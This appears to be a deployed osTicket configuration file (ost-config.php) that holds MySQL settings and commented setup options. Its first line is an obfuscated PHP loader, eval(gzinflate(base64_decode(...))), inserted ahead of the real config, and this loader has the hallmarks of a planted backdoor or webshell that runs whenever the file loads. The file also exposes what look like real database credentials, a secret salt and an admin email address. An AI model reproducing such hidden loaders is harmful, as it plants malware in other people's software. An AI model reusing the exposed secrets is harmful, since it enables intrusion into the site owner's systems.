<?php eval(gzinflate(base64_decode('pRlrc9u48bM70/+AaBhTjGmJol5WbNpJHefuZppLqjid6diOBiJBiRVFMiAlSzH937sLgA/L8vU6zSQCiH1iX8AigU+arzzmBxHzmrrPlx9S3TAe/vqXA7lYrBGzY5zCKuM85hPOkphnQTRrWmIV/vqryM2COCKAP/FC0tRWPDQIcjoIQEgBn7BNkGZpU3cBPgmiIAN5Eu1Ac+fEISVAsjgVILGYsixOYNmdm+Ty2/jvn79cT8ZX19/Gv1+P3//+9ePV2CQdRaDFq6xgxjbMJUimYKiPBHAexQJAXjkOsQyiyHwapqwm2Q3jlNVYPBIGCORBob/zg5BNZiybuHGUsQj2J3V/RGTOshWPSMaDZRMJBIvHPWZzOe4uiIT9D7QgdNKMhywSa6da7Oi6kO7HHHQJQLB1SmA8g58QZ0dHuIOWA/g3WnBHvhP9jSRROmjxS7JBeZe6c9bUsmXiBdzUwiBamJq7zIIlM7UsZo6wilLOB+kKtaW3U5amE7219PrNhLMZBkhIXYie9vd5liVvb9u37Zvvt+27o7ZuEh3+CfaGtKbmM7Q52lBFh+ZLSOA3XyE0zwmq0TTIscATSiEWOScDi7whSk8DiVQweaHryGBsSmGF85vI8fCQCAxH7YoI4MG7LF6581L+AbpZTCTTGjVbJtm2iTwMwQwMVDBRuM+YCcPXmZaYgm0iIilO0OG+qd9jIvr3PMhwp4lZCxEUapwSX4QlAlWkKd4PhbcBrwDIQfw+Spu7LwSu0lbxgG/XuKhEw9dbGYb7oihIp3HWVCGyos47COAsDuN7xpva5OvV+J9X4xv91+vrL5Nv8DV5/8vV79f6Xels9FTiBIkdxlBcKorx1afP11eT9x8+jAHbOLMMRDxyevaoNxoM7dHgVNhe4ynsinJOt0352x10R/3eaNTvmmLaP+n0bMOUwI51MrL69mDYNcV0YJ0MKmDHBoq+bXVMOR2BsBJoA749sK2RKaY9uz+yDFM5QYnuA6jX6QF3MR327O5Jxb3THZ1YwNOU075lV6Lt3mho9WHRFNNhp9+pKIHRyBZs5bTfHwx2RfdOOp0h/APROD2xbWtQMLBHwG5od8EkOLW7w5OTEtgd2MOhfXIyGppi2h2CTVSeQt1hUCMgJsDMNCUaNwhGLrji3NH4jXUnMgE+z/Czc2eQsvatWJXQK2rsrmsQN5Xr9Fkcz0IGa7qpT+GckbM0XPEExmUayYV/M7ZmKUwyFi8pjC6n9yHjiJsEHkx2FRdiUPWpUB3CM4mxWFMTl16V1eCZfnPnHaTJPE6z6ZZ6Hn8xOBX6lDpP9iLVht8tncexXka8BmdPpR6QCe3mT9WD8w6XXlZPfZfH1r7clMW6SE6/Zu02gECz9ppyNW2175NjVRLa4lzYXVwlYUy9VCwXNBVisKQzcAzukqg/5SaV0OtPX/AouL5S46cvH34b64bY/lrcCEjtDx7ZGh614AQWrZuAAjiwi5s7R8uwyBWYtenee0e6TUXBy6CAT8AgesVoF9Q06owljt7Sa5vasz20LO7BN2pbONAycWD6cFbKY5LTyGsadQM9PwQyHwxzL+9jJdZBverX11cRnnJI9XS9OAz8+upTg+0NoN34SRlnfhE+HNXcV9wboriPr+AydjVuFOkA94Pd5FaZXWaEqdN0gb9x+CxrkRxtiqFfSwtu4lILXAKp8X9kxpyu2YLBYZ4+ueJEC1SabSDSPbjK5KjcNAgDf5vTcMqinxRGj7pZHLGcLuNNEOY0yuh0lcJ34tIwSHOaUU43+ZSC13wW4QQvgvkUUgRusxwKSg4ECeW5y6DkcbYRkw3N3UBwcAPAyoF8GXi5x9ItZ2HuBX64cmmUe/Fm625dcD3LWUjXoAP4yc0EKeMBiKMwbrM5j5dbN4hyuNYnDHjnfkhn2zCfAaM4mUPC5kEENZOG+YJC/nKahzQNNnnI1vTHCihhEmS4DNqhTks2E2KW8TRw4TcD46yWeQSphkMcrqkH24k5IGU0yxOKJoLQDtI4ZDAR6gFjuDMuKRcTYDHbwhhLHdFALtgGxjWUHSAHhwbRMc15PAV2UQ5hGf9YgUnSIBRKw+gJtWAi9YV4oVnG5CxegnViUOMY4stlebqN0DZg24yCM4NEjEiPYxJvcig4MV+CqIwBo8LY4Dyw0iZf0zBDp6F6MUDydSDUWAezGIZ7FobTVYab+0kj6oPt8p8sYojyMxBeASaoMwMo7E9IFzMox8Xiz3gdQBipxNAWEJcYrSpcL/5MJrYqwPjqH9+uvl5Pvo1/gwx9q6WnRZdWZNbCbKRw73zdfd8oT508r0GDCPqbJ+Ay9aomRWUv5hFmb2RA7or2AEIf7sWNdvN2mk8MLZJju0EgoaEpKDhpUT2FX751it1HK+iuvmZYEy7nzF3A+InOAlc1l9pvUda1v0FbCbarXRsFDHqsWYa9Z9FvAZ+yBu22WhK5aLdUsyFEkjeOElr1mQpyDpBSg4KqIHNKtOMaFnQ1zSAC5ALYrrMoWopnLM7IMV4OeyfdQe/EIBcl4OiJBm+VmU6rvqDgdeSQmHvCCA9a8Kg63noXWVLuOSbc+Zymc0EN5b2wvqDoEOeZuwDHJNam07f6ONqqf5cENraF+ykEkWV1P9bxO+QcDG0/WQHLNCso6UG3BqTdj/Dn0iIGyUkJlgDjz5FfWnup/xw5EO+nLsivJWnzKfzSMsjZGXLZpbw0EGLXedoC8tH6SAqe9h6e0g7Wy4wBJGDW5v0+5pbYiRTwKzgevCSCETaQExBZN8ffthkTmSSWPkK5rr6QFpyLOQiHQJT5Tf31Ct8JFFODvJCqinA3XQvEY9I5JZi55yKFcXZ8XKbtGPUpWGCwV4kLDnBwI0LN18Q2qqwFKsgRGE6rBUcmaxPnbdIBex4R8fEaP55nmbBFnYsUdHRUZVsN8bUDXMoqbYnXqgr8tAopK3csrCblyh9sjJQ7q4Nrwuub31F/9PRlowbETOzU9l0vIPpQb1WorcIBL76LzRMuHtRMLfPU5cydO/VqU74Uapylzs6Dlmc2xCtUu53FcTilHO4LPGBpS95EW268bGdTfgEHOxziTkTXcnZMV1l86DMKSgPXMY0WhyAXZB/+cILIj9+i3IY5sN7YvTfD2isGHJMyROU9laUmaSD5pGE8PzDT1RQwJdpIvbPuMwNnUJQXxkPRR9ceXLDvrt3RDRUP3Hm3wixx8QK78/7y6+ev13rtVqDXbgVFGwsX9z/goK4WJbIXsGbj7NWHz5fX//pyRebZMjw/k7/T2Nuen6UuD5Ls3Ivd1RLM2wpjl+LunOZt4aDO8KQ17Lbsjt3qWm28NbZncSuZJxcLR1scpo6WHnJH47cN4/SsrRietSX/thDWqA4sZUWIgICro6ToghFHA+s5NSuKtYVTbwnkGrb9QL/7tHn/0H28bbWhL4BC9fJLl7S0PLGxx3PXzjtt8gVWb7ATFNxbujvXjTvjAe7O+MK9li96iC6UB/8WBQ/RjTM4+3DxVe0+BRrdeg8dE5V6caLhA6zkoTIJWg+swyoKn+yR6O2b7/T4Z/lsW9vklKZs0Juo0KhtJOlAx2oYpmV2i+4Pm9rCw54fbrj7g2Vha3EfLFpZLN3sM+YJRyfUETodQqYhx4Zg0m4LVlni/E9xXD6zgIvRXpCaSREKsqxkiYGvyJ0iZxL3WfkIRKOZtBqH1AkPE6fRquUE0AMggaAEzqoW1J6aE7iAYmLgpCrtajd8xQNZJ56Hzp50BLPMWOCJsyZNGcTJ5Jer6xthLYivi/rnm85bq6xHZSECeabevtANqPFWdaFX69j+bYQPJIJ82FZCz4mlTFSrRVXiv2yzxFEslHFM7M3V/fXxoDjTpBKOo7d1fO0vv0qddKkN+LH676KXPEWeucE1hBOe+wCBC8E59UIVGC/5Pm2YREbSBelacIUuCj9Re3oo5BWGBZ6QNzmcdrifFszk/zTVnhn22PO/GBQU2Q1C5G4U51DdwNXZW5SThUGeCnz8Dw==')));?>
<?php
/*********************************************************************
    ost-config.php

    Static osTicket configuration file. Mainly useful for mysql login info.
    Created during installation process and shouldn't change even on upgrades.

    Peter Rotich <peter@osticket.com>
    Copyright (c)  2006-2010 osTicket
    http://www.osticket.com

    Released under the GNU General Public License WITHOUT ANY WARRANTY.
    See LICENSE.TXT for details.

    vim: expandtab sw=4 ts=4 sts=4:
    $Id: $
**********************************************************************/

#Disable direct access.
if(!strcasecmp(basename($_SERVER['SCRIPT_NAME']),basename(__FILE__)) || !defined('INCLUDE_DIR'))
    die('kwaheri rafiki!');

#Install flag
define('OSTINSTALLED',TRUE);
if(OSTINSTALLED!=TRUE){
    if(!file_exists(ROOT_DIR.'setup/install.php')) die('Error: Contact system admin.'); //Something is really wrong!
    //Invoke the installer.
    header('Location: '.ROOT_PATH.'setup/install.php');
    exit;
}

# Encrypt/Decrypt secret key - randomly generated during installation.
define('SECRET_SALT','YHYTfrizV3FeATjBd2UsacTRKbfCqOwI');

#Default admin email. Used only on db connection issues and related alerts.
define('ADMIN_EMAIL','csbowe@gmail.com');

# Database Options
# ---------------------------------------------------
# Mysql Login info
define('DBTYPE','mysql');
define('DBHOST','mysql.lodge104.net');
define('DBNAME','osticket_lodge104_net');
define('DBUSER','osticket_104');
define('DBPASS','ZPQ867bEhUV9');

# Table prefix
define('TABLE_PREFIX','ost_');

#
# SSL Options
# ---------------------------------------------------
# SSL options for MySQL can be enabled by adding a certificate allowed by
# the database server here. To use SSL, you must have a client certificate
# signed by a CA (certificate authority). You can easily create this
# yourself with the EasyRSA suite. Give the public CA certificate, and both
# the public and private parts of your client certificate below.
#
# Once configured, you can ask MySQL to require the certificate for
# connections:
#
# > create user osticket;
# > grant all on osticket.* to osticket require subject '<subject>';
#
# More information (to-be) available in doc/security/hardening.md

# define('DBSSLCA','/path/to/ca.crt');
# define('DBSSLCERT','/path/to/client.crt');
# define('DBSSLKEY','/path/to/client.key');

#
# Mail Options
# ---------------------------------------------------
# Option: MAIL_EOL (default: \n)
#
# Some mail setups do not handle emails with \r\n (CRLF) line endings for
# headers and base64 and quoted-response encoded bodies. This is an error
# and a violation of the internet mail RFCs. However, because this is also
# outside the control of both osTicket development and many server
# administrators, this option can be adjusted for your setup. Many folks who
# experience blank or garbled email from osTicket can adjust this setting to
# use "\n" (LF) instead of the CRLF default.
#
# References:
# http://www.faqs.org/rfcs/rfc2822.html
# https://github.com/osTicket/osTicket-1.8/issues/202
# https://github.com/osTicket/osTicket-1.8/issues/700
# https://github.com/osTicket/osTicket-1.8/issues/759
# https://github.com/osTicket/osTicket-1.8/issues/1217

# define(MAIL_EOL, "\r\n");

#
# HTTP Server Options
# ---------------------------------------------------
# Option: ROOT_PATH (default: <auto detect>, fallback: /)
#
# If you have a strange HTTP server configuration and osTicket cannot
# discover the URL path of where your osTicket is installed, define
# ROOT_PATH here.
#
# The ROOT_PATH is the part of the URL used to access your osTicket
# helpdesk before the '/scp' part and after the hostname. For instance, for
# http://mycompany.com/support', the ROOT_PATH should be '/support/'
#
# ROOT_PATH *must* end with a forward-slash!

# define('ROOT_PATH', '/support/');

#
# Session Storage Options
# ---------------------------------------------------
# Option: SESSION_BACKEND (default: db)
#
# osTicket supports Memcache as a session storage backend if the `memcache`
# pecl extesion is installed. This also requires MEMCACHE_SERVERS to be
# configured as well.
#
# MEMCACHE_SERVERS can be defined as a comma-separated list of host:port
# specifications. If more than one server is listed, the session is written
# to all of the servers for redundancy.
#
# Values: 'db' (default)
#         'memcache' (Use Memcache servers)
#         'system' (use PHP settings as configured (not recommended!))
#
# define('SESSION_BACKEND', 'memcache');
# define('MEMCACHE_SERVERS', 'server1:11211,server2:11211');
?>
